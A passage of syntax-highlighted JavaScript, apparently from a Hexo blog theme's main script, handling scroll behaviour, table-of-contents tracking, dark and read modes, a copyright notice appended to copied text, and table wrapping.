class="string">&#x27;is-top-bar&#x27;</span>)</span><br><span class="line">          <span class="keyword">if</span> (isDown) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($header.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;nav-visible&#x27;</span>)) $header.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;nav-visible&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> (isChatBtnShow &amp;&amp; isChatShow === <span class="literal">true</span>) &#123;</span><br><span class="line">              <span class="title function_">chatBtnHide</span>()</span><br><span class="line">              isChatShow = <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!$header.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;nav-visible&#x27;</span>)) $header.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;nav-visible&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> (isChatBtnHide &amp;&amp; isChatShow === <span class="literal">false</span>) &#123;</span><br><span class="line">              <span class="title function_">chatBtnShow</span>()</span><br><span class="line">              isChatShow = <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          $header.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;nav-fixed&#x27;</span>)</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>($rightside).<span class="title function_">getPropertyValue</span>(<span class="string">&#x27;opacity&#x27;</span>) === <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">            $rightside.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&#x27;opacity: 0.8; transform: translateX(-58px)&#x27;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (currentTop === <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">            $header.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;is-top-bar&#x27;</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          $rightside.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&quot;opacity: &#x27;&#x27;; transform: &#x27;&#x27;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollHeight</span> &lt;= innerHeight) &#123;</span><br><span class="line">          $rightside.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&#x27;opacity: 0.8; transform: translateX(-58px)&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, <span class="number">200</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">scrollCollect</span> = scrollTask</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, scrollCollect)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * toc,anchor</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">const</span> scrollFnToDo = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> isToc = <span class="variable constant_">GLOBAL_CONFIG_SITE</span>.<span class="property">isToc</span></span><br><span class="line">    <span class="keyword">const</span> isAnchor = <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">isAnchor</span></span><br><span class="line">    <span class="keyword">const</span> $article = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;article-container&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!($article &amp;&amp; (isToc || isAnchor))) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> $tocLink, $cardToc, scrollPercent, autoScrollToc, isExpand</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isToc) &#123;</span><br><span class="line">      <span class="keyword">const</span> $cardTocLayout = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;card-toc&#x27;</span>)</span><br><span class="line">      $cardToc = $cardTocLayout.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;toc-content&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">      $tocLink = $cardToc.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.toc-link&#x27;</span>)</span><br><span class="line">      <span class="keyword">const</span> $tocPercentage = $cardTocLayout.<span class="title function_">querySelector</span>(<span class="string">&#x27;.toc-percentage&#x27;</span>)</span><br><span class="line">      isExpand = $cardToc.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;is-expand&#x27;</span>)</span><br><span class="line"></span><br><span class="line">      scrollPercent = <span class="function"><span class="params">currentTop</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> docHeight = $article.<span class="property">clientHeight</span></span><br><span class="line">        <span class="keyword">const</span> winHeight = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span></span><br><span class="line">        <span class="keyword">const</span> headerHeight = $article.<span class="property">offsetTop</span></span><br><span class="line">        <span class="keyword">const</span> contentMath = (docHeight &gt; winHeight) ? (docHeight - winHeight) : (<span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollHeight</span> - winHeight)</span><br><span class="line">        <span class="keyword">const</span> scrollPercent = (currentTop - headerHeight) / (contentMath)</span><br><span class="line">        <span class="keyword">const</span> scrollPercentRounded = <span class="title class_">Math</span>.<span class="title function_">round</span>(scrollPercent * <span class="number">100</span>)</span><br><span class="line">        <span class="keyword">const</span> percentage = (scrollPercentRounded &gt; <span class="number">100</span>) ? <span class="number">100</span> : (scrollPercentRounded &lt;= <span class="number">0</span>) ? <span class="number">0</span> : scrollPercentRounded</span><br><span class="line">        $tocPercentage.<span class="property">textContent</span> = percentage</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">mobileToc</span> = &#123;</span><br><span class="line">        <span class="attr">open</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          $cardTocLayout.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&#x27;animation: toc-open .3s; opacity: 1; right: 55px&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="attr">close</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          $cardTocLayout.<span class="property">style</span>.<span class="property">animation</span> = <span class="string">&#x27;toc-close .2s&#x27;</span></span><br><span class="line">          <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            $cardTocLayout.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&quot;opacity:&#x27;&#x27;; animation: &#x27;&#x27;; right: &#x27;&#x27;&quot;</span></span><br><span class="line">          &#125;, <span class="number">100</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// toc元素點擊</span></span><br><span class="line">      $cardToc.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">        e.<span class="title function_">preventDefault</span>()</span><br><span class="line">        <span class="keyword">const</span> target = e.<span class="property">target</span>.<span class="property">classList</span></span><br><span class="line">        <span class="keyword">if</span> (target.<span class="title function_">contains</span>(<span class="string">&#x27;toc-content&#x27;</span>)) <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">const</span> $target = target.<span class="title function_">contains</span>(<span class="string">&#x27;toc-link&#x27;</span>)</span><br><span class="line">          ? e.<span class="property">target</span></span><br><span class="line">          : e.<span class="property">target</span>.<span class="property">parentElement</span></span><br><span class="line">        btf.<span class="title function_">scrollToDest</span>(btf.<span class="title function_">getEleTop</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="built_in">decodeURI</span>($target.<span class="title function_">getAttribute</span>(<span class="string">&#x27;href&#x27;</span>)).<span class="title function_">replace</span>(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&#x27;</span>))), <span class="number">300</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">innerWidth</span> &lt; <span class="number">900</span>) &#123;</span><br><span class="line">          <span class="variable language_">window</span>.<span class="property">mobileToc</span>.<span class="title function_">close</span>()</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      autoScrollToc = <span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> activePosition = item.<span class="title function_">getBoundingClientRect</span>().<span class="property">top</span></span><br><span class="line">        <span class="keyword">const</span> sidebarScrollTop = $cardToc.<span class="property">scrollTop</span></span><br><span class="line">        <span class="keyword">if</span> (activePosition &gt; (<span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span> - <span class="number">100</span>)) &#123;</span><br><span class="line">          $cardToc.<span class="property">scrollTop</span> = sidebarScrollTop + <span class="number">150</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (activePosition &lt; <span class="number">100</span>) &#123;</span><br><span class="line">          $cardToc.<span class="property">scrollTop</span> = sidebarScrollTop - <span class="number">150</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find head position &amp; add active class</span></span><br><span class="line">    <span class="keyword">const</span> list = $article.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;h1,h2,h3,h4,h5,h6&#x27;</span>)</span><br><span class="line">    <span class="keyword">let</span> detectItem = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> findHeadPosition = <span class="keyword">function</span> (<span class="params">top</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (top === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> currentId = <span class="string">&#x27;&#x27;</span></span><br><span class="line">      <span class="keyword">let</span> currentIndex = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">      list.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">ele, index</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (top &gt; btf.<span class="title function_">getEleTop</span>(ele) - <span class="number">80</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> id = ele.<span class="property">id</span></span><br><span class="line">          currentId = id ? <span class="string">&#x27;#&#x27;</span> + <span class="built_in">encodeURI</span>(id) : <span class="string">&#x27;&#x27;</span></span><br><span class="line">          currentIndex = index</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (detectItem === currentIndex) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (isAnchor) btf.<span class="title function_">updateAnchor</span>(currentId)</span><br><span class="line"></span><br><span class="line">      detectItem = currentIndex</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (isToc) &#123;</span><br><span class="line">        $cardToc.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.active&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">i</span> =&gt;</span> &#123; i.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;active&#x27;</span>) &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (currentId === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> currentActive = $tocLink[currentIndex]</span><br><span class="line">        currentActive.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;active&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">autoScrollToc</span>(currentActive)</span><br><span class="line">        &#125;, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isExpand) <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">let</span> parent = currentActive.<span class="property">parentNode</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (; !parent.<span class="title function_">matches</span>(<span class="string">&#x27;.toc&#x27;</span>); parent = parent.<span class="property">parentNode</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (parent.<span class="title function_">matches</span>(<span class="string">&#x27;li&#x27;</span>)) parent.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;active&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// main of scroll</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">tocScrollFn</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> btf.<span class="title function_">throttle</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> currentTop = <span class="variable language_">window</span>.<span class="property">scrollY</span> || <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span></span><br><span class="line">        isToc &amp;&amp; <span class="title function_">scrollPercent</span>(currentTop)</span><br><span class="line">        <span class="title function_">findHeadPosition</span>(currentTop)</span><br><span class="line">      &#125;, <span class="number">100</span>)()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, tocScrollFn)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Rightside</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">const</span> rightSideFn = &#123;</span><br><span class="line">    <span class="attr">switchReadMode</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// read-mode</span></span><br><span class="line">      <span class="keyword">const</span> $body = <span class="variable language_">document</span>.<span class="property">body</span></span><br><span class="line">      $body.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;read-mode&#x27;</span>)</span><br><span class="line">      <span class="keyword">const</span> newEle = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;button&#x27;</span>)</span><br><span class="line">      newEle.<span class="property">type</span> = <span class="string">&#x27;button&#x27;</span></span><br><span class="line">      newEle.<span class="property">className</span> = <span class="string">&#x27;fas fa-sign-out-alt exit-readmode&#x27;</span></span><br><span class="line">      $body.<span class="title function_">appendChild</span>(newEle)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">clickFn</span> () &#123;</span><br><span class="line">        $body.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;read-mode&#x27;</span>)</span><br><span class="line">        newEle.<span class="title function_">remove</span>()</span><br><span class="line">        newEle.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>, clickFn)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      newEle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, clickFn)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">switchDarkMode</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// Switch Between Light And Dark Mode</span></span><br><span class="line">      <span class="keyword">const</span> nowMode = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-theme&#x27;</span>) === <span class="string">&#x27;dark&#x27;</span> ? <span class="string">&#x27;dark&#x27;</span> : <span class="string">&#x27;light&#x27;</span></span><br><span class="line">      <span class="keyword">if</span> (nowMode === <span class="string">&#x27;light&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_">activateDarkMode</span>()</span><br><span class="line">        saveToLocal.<span class="title function_">set</span>(<span class="string">&#x27;theme&#x27;</span>, <span class="string">&#x27;dark&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">        <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">Snackbar</span> !== <span class="literal">undefined</span> &amp;&amp; btf.<span class="title function_">snackbarShow</span>(<span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">Snackbar</span>.<span class="property">day_to_night</span>)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">activateLightMode</span>()</span><br><span class="line">        saveToLocal.<span class="title function_">set</span>(<span class="string">&#x27;theme&#x27;</span>, <span class="string">&#x27;light&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">        <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">Snackbar</span> !== <span class="literal">undefined</span> &amp;&amp; btf.<span class="title function_">snackbarShow</span>(<span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">Snackbar</span>.<span class="property">night_to_day</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// handle some cases</span></span><br><span class="line">      <span class="keyword">typeof</span> utterancesTheme === <span class="string">&#x27;function&#x27;</span> &amp;&amp; <span class="title function_">utterancesTheme</span>()</span><br><span class="line">      <span class="keyword">typeof</span> changeGiscusTheme === <span class="string">&#x27;function&#x27;</span> &amp;&amp; <span class="title function_">changeGiscusTheme</span>()</span><br><span class="line">      <span class="keyword">typeof</span> <span class="variable constant_">FB</span> === <span class="string">&#x27;object&#x27;</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">loadFBComment</span> &amp;&amp; <span class="variable language_">window</span>.<span class="title function_">loadFBComment</span>()</span><br><span class="line">      <span class="keyword">typeof</span> runMermaid === <span class="string">&#x27;function&#x27;</span> &amp;&amp; <span class="variable language_">window</span>.<span class="title function_">runMermaid</span>()</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">showOrHideBtn</span>: <span class="function">(<span class="params">e</span>) =&gt;</span> &#123; <span class="comment">// rightside 點擊設置 按鈕 展開</span></span><br><span class="line">      <span class="keyword">const</span> rightsideHideClassList = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;rightside-config-hide&#x27;</span>).<span class="property">classList</span></span><br><span class="line">      rightsideHideClassList.<span class="title function_">toggle</span>(<span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">      <span class="keyword">if</span> (e.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;show&#x27;</span>)) &#123;</span><br><span class="line">        rightsideHideClassList.<span class="title function_">add</span>(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          rightsideHideClassList.<span class="title function_">remove</span>(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">        &#125;, <span class="number">300</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      e.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">scrollToTop</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// Back to top</span></span><br><span class="line">      btf.<span class="title function_">scrollToDest</span>(<span class="number">0</span>, <span class="number">500</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">hideAsideBtn</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// Hide aside</span></span><br><span class="line">      <span class="keyword">const</span> $htmlDom = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">classList</span></span><br><span class="line">      $htmlDom.<span class="title function_">contains</span>(<span class="string">&#x27;hide-aside&#x27;</span>)</span><br><span class="line">        ? saveToLocal.<span class="title function_">set</span>(<span class="string">&#x27;aside-status&#x27;</span>, <span class="string">&#x27;show&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">        : saveToLocal.<span class="title function_">set</span>(<span class="string">&#x27;aside-status&#x27;</span>, <span class="string">&#x27;hide&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">      $htmlDom.<span class="title function_">toggle</span>(<span class="string">&#x27;hide-aside&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">runMobileToc</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;card-toc&#x27;</span>)).<span class="title function_">getPropertyValue</span>(<span class="string">&#x27;opacity&#x27;</span>) === <span class="string">&#x27;0&#x27;</span>) <span class="variable language_">window</span>.<span class="property">mobileToc</span>.<span class="title function_">open</span>()</span><br><span class="line">      <span class="keyword">else</span> <span class="variable language_">window</span>.<span class="property">mobileToc</span>.<span class="title function_">close</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;rightside&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> $target = e.<span class="property">target</span>.<span class="property">id</span> ? e.<span class="property">target</span> : e.<span class="property">target</span>.<span class="property">parentNode</span></span><br><span class="line">    <span class="keyword">switch</span> ($target.<span class="property">id</span>) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;go-up&#x27;</span>:</span><br><span class="line">        rightSideFn.<span class="title function_">scrollToTop</span>()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;rightside_config&#x27;</span>:</span><br><span class="line">        rightSideFn.<span class="title function_">showOrHideBtn</span>($target)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;mobile-toc-button&#x27;</span>:</span><br><span class="line">        rightSideFn.<span class="title function_">runMobileToc</span>()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;readmode&#x27;</span>:</span><br><span class="line">        rightSideFn.<span class="title function_">switchReadMode</span>()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;darkmode&#x27;</span>:</span><br><span class="line">        rightSideFn.<span class="title function_">switchDarkMode</span>()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;hide-aside-btn&#x27;</span>:</span><br><span class="line">        rightSideFn.<span class="title function_">hideAsideBtn</span>()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="attr">default</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * menu</span></span><br><span class="line"><span class="comment">   * 側邊欄sub-menu 展開/收縮</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">clickFnOfSubMenu</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#sidebar-menus .site-page.group&#x27;</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">      item.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;hide&#x27;</span>)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 複製時加上版權信息</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">addCopyright</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> copyright = <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">copyright</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">oncopy</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      e.<span class="title function_">preventDefault</span>()</span><br><span class="line">      <span class="keyword">let</span> textFont; <span class="keyword">const</span> copyFont = <span class="variable language_">window</span>.<span class="title function_">getSelection</span>(<span class="number">0</span>).<span class="title function_">toString</span>()</span><br><span class="line">      <span class="keyword">if</span> (copyFont.<span class="property">length</span> &gt; copyright.<span class="property">limitCount</span>) &#123;</span><br><span class="line">        textFont = copyFont + <span class="string">&#x27;\n&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">        copyright.<span class="property">languages</span>.<span class="property">author</span> + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">        copyright.<span class="property">languages</span>.<span class="property">link</span> + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">        copyright.<span class="property">languages</span>.<span class="property">source</span> + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">        copyright.<span class="property">languages</span>.<span class="property">info</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        textFont = copyFont</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (e.<span class="property">clipboardData</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="property">clipboardData</span>.<span class="title function_">setData</span>(<span class="string">&#x27;text&#x27;</span>, textFont)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">clipboardData</span>.<span class="title function_">setData</span>(<span class="string">&#x27;text&#x27;</span>, textFont)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 網頁運行時間</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">addRuntime</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> $runtimeCount = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;runtimeshow&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ($runtimeCount) &#123;</span><br><span class="line">      <span class="keyword">const</span> publishDate = $runtimeCount.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-publishDate&#x27;</span>)</span><br><span class="line">      $runtimeCount.<span class="property">innerText</span> = btf.<span class="title function_">diffDate</span>(publishDate) + <span class="string">&#x27; &#x27;</span> + <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">runtime</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 最後一次更新時間</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">addLastPushDate</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> $lastPushDateItem = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;last-push-date&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ($lastPushDateItem) &#123;</span><br><span class="line">      <span class="keyword">const</span> lastPushDate = $lastPushDateItem.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-lastPushDate&#x27;</span>)</span><br><span class="line">      $lastPushDateItem.<span class="property">innerText</span> = btf.<span class="title function_">diffDate</span>(lastPushDate, <span class="literal">true</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * table overflow</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">addTableWrap</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> $table = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#article-container :not(.highlight) &gt; table, #article-container &gt; table&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ($table.<span class="property">length</span>) &#123;</span><br><span class="line">      $table.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        btf.<span class="title function_">wrap</span>(item, <span class="string">&#x27;div&#x27;</span>, &#123; <span class="attr">class</span>: <span class="string">&#x27;table-wrap&#x27;</span> &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * tag-hide</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">const</span> clickFnOfTagHide = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> $hideInline = <span class="variable 